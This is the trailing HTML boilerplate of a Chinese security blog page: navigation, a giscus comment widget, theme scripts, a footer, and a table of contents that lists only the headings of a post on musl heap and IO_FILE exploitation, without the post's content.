				<a class="next" rel="next" href="/2024/12/11/ARM64%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84%E7%BC%96%E7%A8%8B/">
					<span class="title flex justify-center items-center">
						<span class="post-nav-title-item truncate max-w-48">ARM64体系结构编程</span>
						<span class="post-nav-item">Next posts</span>
					</span>
					<span class="right arrow-icon flex justify-center items-center">
						<i class="fa-solid fa-chevron-right"></i>
					</span>
				</a>
			</div>
			
		</div>
		


		
		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
			<div class="comments-container mt-10 w-full ">
    <div id="comment-anchor" class="w-full h-2.5"></div>
    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
        Comments
    </div>
    

        
            
    <div id="giscus-container"></div>
    <script data-swup-reload-script defer>
        async function loadGiscus() {
            const giscusConfig = {
                'src': 'https://giscus.app/client.js',
                'data-repo': 'jelasin/jelasin.github.io',
                'data-repo-id': 'R_kgDOKVydDA',
                'data-category': 'Announcements',
                'data-category-id': 'DIC_kwDOKVydDM4CZe2W',
                'data-mapping': 'pathname',
                'data-strict': '0',
                'data-reactions-enabled': '1',
                'data-emit-metadata': '1',
                'data-theme': 'preferred_color_scheme',
                'data-lang': 'zh-CN',
                'data-input-position': 'bottom',
                'data-loading': 'not-lazy',
                'crossorigin': 'anonymous',
                'async': true
            }
            const giscusScript = document.createElement('script');
            for (const key in giscusConfig) {
                giscusScript.setAttribute(key, giscusConfig[key]);
            }
            document.getElementById('giscus-container').appendChild(giscusScript);
        }
        if ('true') {
            let loadGiscusTimeout = setTimeout(() => {
                loadGiscus();
                clearTimeout(loadGiscusTimeout);
            }, 1000);
        } else {
            document.addEventListener('DOMContentLoaded', loadGiscus);
        }
    </script>


        
        
    
</div>

		</div>
		
	</div>

	
	<div class="toc-content-container">
		<div class="post-toc-wrap">
	<div class="post-toc">
		<div class="toc-title">On this page</div>
		<div class="page-title">深入理解Pwn_musl及相关例题</div>
		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Musl-heap-musl-1-2-0"><span class="nav-text">Musl heap (musl-1.2.0)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84"><span class="nav-text">数据结构</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#mal"><span class="nav-text">mal</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#bin"><span class="nav-text">bin</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#chunk"><span class="nav-text">chunk</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90"><span class="nav-text">函数分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#malloc"><span class="nav-text">malloc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#expand-heap"><span class="nav-text">expand_heap</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#expand-heap-1"><span class="nav-text">__expand_heap</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pretrim"><span class="nav-text">pretrim</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#trim"><span class="nav-text">trim</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#free"><span class="nav-text">free</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#bin-chunk"><span class="nav-text">__bin_chunk</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A0%86%E5%88%A9%E7%94%A8"><span class="nav-text">堆利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#unlink"><span class="nav-text">unlink</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp"><span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#IO-FILE-%E5%88%A9%E7%94%A8"><span class="nav-text">IO_FILE 利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#exit-%E8%B0%83%E7%94%A8%E9%93%BE"><span class="nav-text">exit 调用链</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#puts-%E8%B0%83%E7%94%A8%E9%93%BE"><span class="nav-text">puts 调用链</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-1"><span class="nav-text">exp</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Musl-heap-musl-1-2-3"><span class="nav-text">Musl heap (musl-1.2.3)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-1"><span class="nav-text">数据结构</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#deque"><span class="nav-text">deque</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#malloc-context"><span class="nav-text">malloc_context</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#meta-area"><span class="nav-text">meta_area</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#meta"><span class="nav-text">meta</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#group"><span class="nav-text">group</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#chunk-1"><span class="nav-text">chunk</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90-1"><span class="nav-text">函数分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#malloc-1"><span class="nav-text">malloc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#alloc-slot"><span class="nav-text">alloc_slot</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#try-avail"><span class="nav-text">try_avail</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#enframe"><span class="nav-text">enframe</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#free-1"><span class="nav-text">free</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#nontrivial-free"><span class="nav-text">nontrivial_free</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#free-group"><span class="nav-text">free_group</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A0%86%E5%88%A9%E7%94%A8-1"><span class="nav-text">堆利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#unlink-1"><span class="nav-text">unlink</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-2"><span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#IO-FILE-%E5%88%A9%E7%94%A8-1"><span class="nav-text">IO_FILE 利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#exit-%E8%B0%83%E7%94%A8%E9%93%BE-1"><span class="nav-text">exit 调用链</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#puts-%E8%B0%83%E7%94%A8%E9%93%BE-1"><span class="nav-text">puts 调用链</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-3"><span class="nav-text">exp</span></a></li></ol></li></ol></li></ol>

	</div>
</div>
	</div>
	
</div>
			</div>

			
		</div>

		<div class="main-content-footer">
			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
    <div class="info-container py-3 text-center">
        
            <div class="customize-info my-1">关山初度尘未洗，策马扬鞭再奋蹄。</div>
        
        <div class="text-center">
            &copy;
            
              <span>2023</span>
              -
            
            2025&nbsp;&nbsp;<i class="fa-solid fa-circle-info fa-beat-fade" style="--fa-beat-fade-opacity: 0.67; --fa-beat-fade-scale: 1.075;" ></i>&nbsp;&nbsp;<a href="/">韩乔落</a>
            
                
                <p class="post-count space-x-0.5">
                    <span>
                        135 posts in total
                    </span>
                    
                </p>
            
        </div>
        
            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
                
                
            </div>
        
        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.5</a></span>
        </div>
        
        
            <div>
                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
            </div>
        
        
            <script data-swup-reload-script>
                try {
                    function odometer_init() {
                    const elements = document.querySelectorAll('.odometer');
                    elements.forEach(el => {
                        new Odometer({
                            el,
                            format: '( ddd).dd',
                            duration: 200
                        });
                    });
                    }
                    odometer_init();
                } catch (error) {}
            </script>
        
        
        
    </div>  
</footer>
		</div>
	</div>

	
	<div class="post-tools">
		<div class="post-tools-container">
	<ul class="article-tools-list">
		<!-- TOC aside toggle -->
		
		<li class="right-bottom-tools page-aside-toggle">
			<i class="fa-regular fa-outdent"></i>
		</li>
		

		<!-- go comment -->
		
		<li class="go-comment">
			<i class="fa-regular fa-comments"></i>
		</li>
		
	</ul>
</div>
	</div>
	

	<div class="right-side-tools-container">
		<div class="side-tools-container">
	<ul class="hidden-tools-list">
		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-plus"></i>
		</li>

		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-minus"></i>
		</li>

		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
			<i class="fa-regular fa-moon"></i>
		</li>

		<!-- rss -->
		

		

		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
			<i class="fa-regular fa-arrow-down"></i>
		</li>
	</ul>

	<ul class="visible-tools-list">
		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
			<i class="fa-regular fa-cog fa-spin"></i>
		</li>
		
		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
			<i class="arrow-up fas fa-arrow-up"></i>
			<span class="percent"></span>
		</li>
		
		
	</ul>
</div>
	</div>

	<div class="image-viewer-container">
	<img src="">
</div>

	
	<div class="search-pop-overlay">
	<div class="popup search-popup">
		<div class="search-header">
			<span class="search-input-field-pre">
				<i class="fa-solid fa-keyboard"></i>
			</span>
			<div class="search-input-container">
				<input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="Search..." spellcheck="false" type="search" class="search-input">
			</div>
			<span class="popup-btn-close">
				<i class="fa-solid fa-times"></i>
			</span>
		</div>
		<div id="search-result">
			<div id="no-result">
				<i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
			</div>
		</div>
	</div>
</div>
	

</main>


<script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/libs/Swup.min.js" ></script><script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/libs/SwupSlideTheme.min.js" ></script><script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/libs/SwupScriptsPlugin.min.js" ></script><script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/libs/SwupProgressPlugin.min.js" ></script><script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/libs/SwupScrollPlugin.min.js" ></script><script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/libs/SwupPreloadPlugin.min.js" ></script>
<script>
    const swup = new Swup({
        plugins: [
            new SwupScriptsPlugin({
                optin: true,
            }),
            new SwupProgressPlugin(),
            new SwupScrollPlugin({
                offset: 80,
            }),
            new SwupSlideTheme({
                mainElement: ".main-content-body",
            }),
            new SwupPreloadPlugin(),
        ],
        containers: ["#swup"],
    });
</script>




	<script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/tools/imageViewer.js" ></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/utils.js" ></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/main.js" ></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/layouts/navbarShrink.js" ></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/tools/scrollTopBottom.js" ></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/tools/lightDarkSwitch.js" ></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/layouts/categoryList.js" ></script>


    <script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/tools/localSearch.js" ></script>



    <script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/tools/codeBlock.js" ></script>



    <script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/layouts/lazyload.js" ></script>



    <script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/tools/runtime.js" ></script>
    <script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/libs/odometer.min.js" ></script>
    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/assets/odometer-theme-minimal.css">



  <script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/libs/Typed.min.js" ></script>
  <script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/plugins/typed.js" ></script>







    <script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/libs/anime.min.js" ></script>




    <script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/tools/tocToggle.js" data-swup-reload-script></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/layouts/toc.js" data-swup-reload-script></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/plugins/tabs.js" data-swup-reload-script></script>


<script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/libs/moment-with-locales.min.js" data-swup-reload-script></script>
<script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/js/build/layouts/essays.js" data-swup-reload-script></script>




	
</body>

</html>